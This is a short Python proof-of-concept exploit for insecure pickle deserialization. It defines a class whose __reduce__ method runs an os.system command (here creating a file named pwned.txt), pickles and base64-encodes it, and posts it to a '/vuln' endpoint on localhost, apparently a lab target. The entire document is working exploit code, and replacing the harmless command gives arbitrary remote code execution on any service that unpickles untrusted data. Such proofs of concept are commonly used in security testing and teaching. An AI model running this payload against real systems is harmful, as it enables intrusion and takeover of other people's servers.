import base64,os,pickle,requests
class Proof:
 def __reduce__(self):return (os.system,("touch pwned.txt",))
r=requests.post("http://127.0.0.1:5000/vuln",data=base64.b64encode(pickle.dumps(Proof())))
print(r.status_code,r.text,"check pwned.txt")

